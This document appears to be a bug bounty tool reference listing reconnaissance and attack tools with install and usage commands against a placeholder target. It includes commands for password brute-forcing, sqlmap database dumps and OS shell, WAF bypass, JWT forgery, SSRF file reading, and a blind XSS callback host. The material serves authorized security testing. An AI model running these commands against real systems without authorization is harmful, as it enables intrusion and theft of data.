# TOOLS-ARSENAL.md - Security Testing Tools Reference

> Complete reference of tools for bug bounty hunting with installation and usage guides.

---

## Tool Categories

### 1. Subdomain Enumeration

#### subfinder
```bash
# Install
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Usage
subfinder -d target.com -o subdomains.txt
subfinder -d target.com -all -silent
subfinder -dL domains.txt -o all_subdomains.txt
```

#### amass
```bash
# Install
go install -v github.com/owasp-amass/amass/v4/...@master

# Usage
amass enum -passive -d target.com -o amass_subs.txt
amass enum -active -d target.com -o amass_active.txt
amass intel -org "Target Company" -o amass_intel.txt
```

#### assetfinder
```bash
# Install
go install github.com/tomnomnom/assetfinder@latest

# Usage
assetfinder --subs-only target.com > assetfinder_subs.txt
```

---

### 2. HTTP Probing

#### httpx
```bash
# Install
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Usage
cat subdomains.txt | httpx -silent -status-code -title -tech-detect
cat subdomains.txt | httpx -silent -follow-redirects -content-length
httpx -u https://target.com -tech-detect -status-code -title -server
```

---

### 3. Port Scanning

#### nmap
```bash
# Quick scan
nmap -sV -sC -T4 --top-ports 1000 target.com

# Full port scan
nmap -sV -p- -T4 target.com

# Vulnerability scan
nmap --script vuln target.com

# UDP scan
nmap -sU --top-ports 100 target.com

# Service detection
nmap -sV -sC -A target.com
```

#### masscan
```bash
# Fast full port scan
masscan -iL ips.txt -p1-65535 --rate 10000 -oG masscan_output.txt
```

---

### 4. Directory/File Fuzzing

#### ffuf
```bash
# Install
go install github.com/ffuf/ffuf/v2@latest

# Directory fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403

# File extension fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.jsp,.html,.js,.txt,.bak

# Parameter fuzzing
ffuf -u https://target.com/page?FUZZ=value -w params.txt -mc all -fc 404

# POST data fuzzing
ffuf -u https://target.com/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt

# Header fuzzing
ffuf -u https://target.com -H "X-Custom: FUZZ" -w wordlist.txt

# Subdomain fuzzing
ffuf -u https://FUZZ.target.com -w subdomains.txt -mc 200

# Recursive fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2
```

---

### 5. Vulnerability Scanning

#### nuclei
```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Scan single target
nuclei -u https://target.com -o results.txt

# Scan with severity filter
nuclei -u https://target.com -severity critical,high

# Scan for CVEs only
nuclei -u https://target.com -t cves/

# Scan for misconfigurations
nuclei -u https://target.com -t misconfiguration/

# Scan list of targets
nuclei -l alive_hosts.txt -severity critical,high -o nuclei_results.txt

# Custom template
nuclei -u https://target.com -t /path/to/custom-template.yaml
```

---

### 6. URL Discovery

#### gau (GetAllUrls)
```bash
# Install
go install github.com/lc/gau/v2/cmd/gau@latest

# Usage
echo target.com | gau --threads 5 > urls.txt
echo target.com | gau --subs --threads 5 > all_urls.txt
```

#### waybackurls
```bash
# Install
go install github.com/tomnomnom/waybackurls@latest

# Usage
echo target.com | waybackurls > wayback_urls.txt
```

#### katana
```bash
# Install
go install github.com/projectdiscovery/katana/cmd/katana@latest

# Usage
katana -u https://target.com -d 3 -jc -o crawled.txt
katana -u https://target.com -d 5 -ef css,png,jpg -o crawled_filtered.txt
```

---

### 7. SQL Injection

#### sqlmap
```bash
# Basic test
sqlmap -u "https://target.com/page?id=1" --batch

# With cookie/auth
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123" --batch

# From request file
sqlmap -r request.txt --batch --level 5 --risk 3

# Enumerate databases
sqlmap -u "https://target.com/page?id=1" --dbs --batch

# Dump table
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump --batch

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell --batch

# Tamper scripts (WAF bypass)
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between --batch
```

---

### 8. XSS Testing

#### dalfox
```bash
# Install
go install github.com/hahwul/dalfox/v2@latest

# Single URL
dalfox url "https://target.com/search?q=test"

# With blind XSS callback
dalfox url "https://target.com/search?q=test" --blind https://your-callback.com

# From file
dalfox file urls_with_params.txt

# Pipeline
cat parameterized_urls.txt | dalfox pipe
```

---

### 9. DNS Tools

#### dnsx
```bash
# Install
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest

# Resolve domains
cat subdomains.txt | dnsx -silent -a -resp

# CNAME records (subdomain takeover)
cat subdomains.txt | dnsx -silent -cname -resp

# Reverse DNS
cat ips.txt | dnsx -silent -ptr -resp
```

---

### 10. JWT Testing

#### jwt_tool
```bash
# Install
pip3 install jwt_tool

# Analyze token
jwt_tool <token>

# Test none algorithm
jwt_tool <token> -X a

# Brute force secret
jwt_tool <token> -C -d wordlist.txt

# Tamper claims
jwt_tool <token> -T -S hs256 -p "secret"
```

---

### 11. SSRF Testing

#### ssrfmap
```bash
# Install
git clone https://github.com/swisskyrepo/SSRFmap
pip3 install -r requirements.txt

# Usage
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m portscan
```

---

### 12. Useful One-Liners

```bash
# Find all subdomains, check alive, scan for vulns
subfinder -d target.com -silent | httpx -silent | nuclei -severity critical,high

# Find parameters and test for XSS
echo target.com | gau | grep "=" | sort -u | dalfox pipe

# Find JS files and extract endpoints
katana -u https://target.com -jc | grep "\.js$" | sort -u

# Check security headers
curl -sI https://target.com | grep -iE "strict|content-security|x-frame|x-content"

# Find open redirects
echo target.com | gau | grep -iE "redirect|url=|next=|return=|goto=" | sort -u

# Find potential SSRF endpoints
echo target.com | gau | grep -iE "url=|uri=|path=|src=|dest=|redirect=|fetch=|proxy=" | sort -u
```

---

### 13. Wordlists

**Recommended wordlists:**
- SecLists: https://github.com/danielmiessler/SecLists
- Assetnote Wordlists: https://wordlists.assetnote.io/
- FuzzDB: https://github.com/fuzzdb-project/fuzzdb
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

**Key wordlists from SecLists:**
- Discovery/Web-Content/common.txt
- Discovery/Web-Content/big.txt
- Discovery/Web-Content/raft-large-directories.txt
- Discovery/DNS/subdomains-top1million-5000.txt
- Fuzzing/LFI/LFI-Jhaddix.txt
- Passwords/Common-Credentials/10k-most-common.txt
